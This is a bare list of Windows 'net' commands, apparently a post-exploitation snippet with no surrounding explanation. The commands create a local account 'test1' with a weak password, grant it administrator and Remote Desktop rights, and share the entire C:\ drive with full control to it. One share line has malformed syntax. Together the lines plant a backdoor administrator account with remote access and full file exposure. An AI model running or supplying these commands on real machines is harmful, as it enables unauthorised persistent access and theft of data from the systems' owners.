net user test1 qwe123 /add
net localgroup administrators test1 /add
net localgroup "Remote Desktop Users" test1 /add
net share concfg*C:\/grant:test1,full
net share SHARE_NAME=c:\ /grant:test1,full